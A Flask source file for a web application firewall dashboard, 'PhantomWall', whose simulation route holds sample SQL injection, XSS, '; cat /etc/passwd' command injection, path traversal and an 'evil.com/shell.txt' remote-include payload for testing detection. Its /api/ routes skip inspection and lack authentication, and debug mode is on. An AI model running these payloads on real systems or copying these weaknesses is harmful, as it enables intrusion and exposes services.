import os
import json
import time
import random
from datetime import datetime, timedelta
from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from functools import wraps

from core.engine import PhantomCore
from utils.logger import LogManager
from utils.config import ConfigManager
from utils.i18n import I18n, get_text_direction


def create_app(config_path: str = "phantomwall.json"):
    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    app = Flask(__name__, 
                template_folder=os.path.join(base_dir, "templates"),
                static_folder=os.path.join(base_dir, "static"))
    app.secret_key = os.urandom(24)
    
    cfg = ConfigManager(config_path)
    app.config["waf_config"] = cfg
    
    core = PhantomCore(cfg.get_all())
    app.config["waf_core"] = core
    
    logger = LogManager()
    app.config["log_manager"] = logger
    
    @app.before_request
    def check_locale():
        if "locale" not in session:
            session["locale"] = cfg.get("language", "en")
    
    def get_i18n():
        return I18n(session.get("locale", "en"))
    
    @app.before_request
    def waf_inspect():
        if request.path.startswith("/static/") or request.path.startswith("/api/"):
            return None

        headers = dict(request.headers)
        body = ""
        if request.method in ["POST", "PUT", "PATCH"]:
            try:
                body = request.get_data(as_text=True)[:1000]
            except:
                body = ""

        result = core.inspect_request(
            method=request.method,
            path=request.path,
            headers=headers,
            body=body,
            query_string=request.query_string.decode() if request.query_string else "",
            source_ip=request.remote_addr or "127.0.0.1"
        )

        if result.event:
            logger.save_event(result.event)

        if not result.allowed:
            return jsonify({
                "error": "Forbidden",
                "message": result.message,
                "request_id": result.request_id
            }), result.status_code

        return None
    
    @app.route("/")
    def index():
        return redirect(url_for("dashboard"))
    
    @app.route("/dashboard")
    def dashboard():
        i18n = get_i18n()
        core_stats = core.get_stats()
        log_stats = logger.get_stats(days=7)
        recent_events = logger.get_recent_events(limit=10)
        
        stats = {
            **core_stats,
            "unique_ips": log_stats.get("unique_ips", 0),
            "logged_count": log_stats.get("logged_count", 0)
        }
        
        return render_template("dashboard.html",
                             i18n=i18n,
                             text_direction=get_text_direction(session.get("locale", "en")),
                             locale=session.get("locale", "en"),
                             stats=stats,
                             recent_events=recent_events,
                             timeline=log_stats.get("timeline", []),
                             attack_types=log_stats.get("attack_types", {}),
                             threat_levels=log_stats.get("threat_levels", {}))
    
    @app.route("/logs")
    def logs():
        i18n = get_i18n()
        
        page = request.args.get("page", 1, type=int)
        per_page = 50
        attack_type = request.args.get("attack_type", "")
        threat_level = request.args.get("threat_level", "")
        source_ip = request.args.get("source_ip", "")
        
        events = logger.get_events(
            limit=per_page,
            offset=(page - 1) * per_page,
            attack_type=attack_type if attack_type else None,
            threat_level=threat_level if threat_level else None,
            source_ip=source_ip if source_ip else None
        )
        
        distribution = logger.get_attack_type_distribution()
        
        return render_template("logs.html",
                             i18n=i18n,
                             text_direction=get_text_direction(session.get("locale", "en")),
                             locale=session.get("locale", "en"),
                             events=events,
                             distribution=distribution,
                             page=page,
                             filters={
                                 "attack_type": attack_type,
                                 "threat_level": threat_level,
                                 "source_ip": source_ip
                             })
    
    @app.route("/settings", methods=["GET", "POST"])
    def settings():
        i18n = get_i18n()
        
        if request.method == "POST":
            updates = {
                "enabled": request.form.get("enabled") == "on",
                "blocking_mode": request.form.get("blocking_mode") == "on",
                "sensitivity": request.form.get("sensitivity", "medium"),
                "rate_limit": int(request.form.get("rate_limit", 100)),
                "language": request.form.get("language", "en"),
                "enable_logging": request.form.get("enable_logging") == "on",
                "log_retention_days": int(request.form.get("log_retention_days", 30))
            }
            cfg.update(updates)
            core.update_config(updates)
            session["locale"] = updates["language"]
            
            return redirect(url_for("settings", saved="true"))
        
        return render_template("settings.html",
                             i18n=i18n,
                             text_direction=get_text_direction(session.get("locale", "en")),
                             locale=session.get("locale", "en"),
                             config=cfg.get_all(),
                             saved=request.args.get("saved"))
    
    @app.route("/test")
    def test_page():
        i18n = get_i18n()
        return render_template("test.html",
                             i18n=i18n,
                             text_direction=get_text_direction(session.get("locale", "en")),
                             locale=session.get("locale", "en"))
    
    @app.route("/about")
    def about():
        i18n = get_i18n()
        return render_template("about.html",
                             i18n=i18n,
                             text_direction=get_text_direction(session.get("locale", "en")),
                             locale=session.get("locale", "en"))
    
    @app.route("/api/test", methods=["POST"])
    def api_test():
        data = request.get_json()
        
        method = data.get("method", "GET")
        url = data.get("url", "/")
        headers = data.get("headers", {})
        payload = data.get("payload", "")
        
        test_headers = {k: v for k, v in headers.items() if v}
        
        result = core.inspect_request(
            method=method,
            path=url,
            headers=test_headers,
            body=payload,
            query_string="",
            source_ip="127.0.0.1"
        )
        
        if result.event:
            logger.save_event(result.event)
        
        return jsonify({
            "allowed": result.allowed,
            "status_code": result.status_code,
            "message": result.message,
            "request_id": result.request_id,
            "threat_detected": result.event is not None,
            "attack_type": result.event.attack_type if result.event else None,
            "threat_level": result.event.threat_level if result.event else None,
            "rule_triggered": result.event.rule_id if result.event else None
        })
    
    @app.route("/api/stats")
    def api_stats():
        core_stats = core.get_stats()
        log_stats = logger.get_stats(days=1)
        
        return jsonify({
            **core_stats,
            "unique_ips": log_stats.get("unique_ips", 0),
            "attack_types": log_stats.get("attack_types", {}),
            "timeline": log_stats.get("timeline", [])[-24:]
        })
    
    @app.route("/api/events/recent")
    def api_recent_events():
        limit = request.args.get("limit", 10, type=int)
        events = logger.get_recent_events(limit=limit)
        return jsonify(events)
    
    @app.route("/api/event/<int:event_id>")
    def api_event_detail(event_id):
        event = logger.get_event_by_id(event_id)
        if event:
            return jsonify(event)
        return jsonify({"error": "Event not found"}), 404
    
    @app.route("/api/logs/export")
    def api_export_logs():
        format_type = request.args.get("format", "json")
        start_date = request.args.get("start_date")
        end_date = request.args.get("end_date")
        
        data = logger.export_logs(format_type, start_date, end_date)
        
        if format_type == "json":
            return app.response_class(
                data,
                mimetype="application/json",
                headers={"Content-Disposition": "attachment;filename=phantomwall_logs.json"}
            )
        else:
            return app.response_class(
                data,
                mimetype="text/csv",
                headers={"Content-Disposition": "attachment;filename=phantomwall_logs.csv"}
            )
    
    @app.route("/api/whitelist", methods=["POST", "DELETE"])
    def manage_whitelist():
        if request.method == "POST":
            ip = request.get_json().get("ip", "")
            if ip:
                cfg.add_to_whitelist(ip)
                core.whitelist_ip(ip)
                return jsonify({"success": True, "whitelist": cfg.get("whitelist")})
        else:
            ip = request.get_json().get("ip", "")
            if ip:
                cfg.remove_from_whitelist(ip)
                return jsonify({"success": True, "whitelist": cfg.get("whitelist")})
        
        return jsonify({"success": False})
    
    @app.route("/api/blacklist", methods=["POST", "DELETE"])
    def manage_blacklist():
        if request.method == "POST":
            ip = request.get_json().get("ip", "")
            if ip:
                cfg.add_to_blacklist(ip)
                core.blacklist_ip(ip)
                return jsonify({"success": True, "blacklist": cfg.get("blacklist")})
        else:
            ip = request.get_json().get("ip", "")
            if ip:
                cfg.remove_from_blacklist(ip)
                return jsonify({"success": True, "blacklist": cfg.get("blacklist")})
        
        return jsonify({"success": False})
    
    @app.route("/api/config/reset", methods=["POST"])
    def reset_config():
        cfg.reset_to_defaults()
        core.update_config(cfg.get_all())
        session["locale"] = cfg.get("language")
        return jsonify({"success": True, "config": cfg.get_all()})
    
    @app.route("/api/clear-logs", methods=["POST"])
    def clear_logs():
        days = request.get_json().get("days", 30)
        deleted = logger.clear_old_logs(days)
        return jsonify({"success": True, "deleted": deleted})
    
    @app.route("/api/simulate/<attack_type>")
    def simulate_attack(attack_type):
        simulations = {
            "sqli": ("/api/login", "POST", {"username": "admin' OR '1'='1", "password": "test"}),
            "xss": ("/search", "GET", {}, "<script>alert('xss')</script>"),
            "cmd": ("/api/exec", "POST", {}, "; cat /etc/passwd"),
            "path": ("/download", "GET", {}, "../../../etc/passwd"),
            "file": ("/include", "GET", {}, "?file=http://evil.com/shell.txt")
        }
        
        if attack_type not in simulations:
            return jsonify({"error": "Unknown attack type"}), 400
        
        path, method, default_params, *body = simulations[attack_type]
        body = body[0] if body else ""
        
        result = core.inspect_request(
            method=method,
            path=path,
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "PhantomWall-Test/1.0"},
            body=body,
            query_string="",
            source_ip="127.0.0.1"
        )
        
        if result.event:
            logger.save_event(result.event)
        
        return jsonify({
            "attack_type": attack_type,
            "detected": not result.allowed or result.event is not None,
            "blocked": not result.allowed,
            "message": result.message,
            "rule_triggered": result.event.rule_id if result.event else None
        })
    
    return app


if __name__ == "__main__":
    app = create_app()
    cfg = app.config["waf_config"]
    app.run(
        host=cfg.get("host", "127.0.0.1"),
        port=cfg.get("port", 8080),
        debug=True
    )
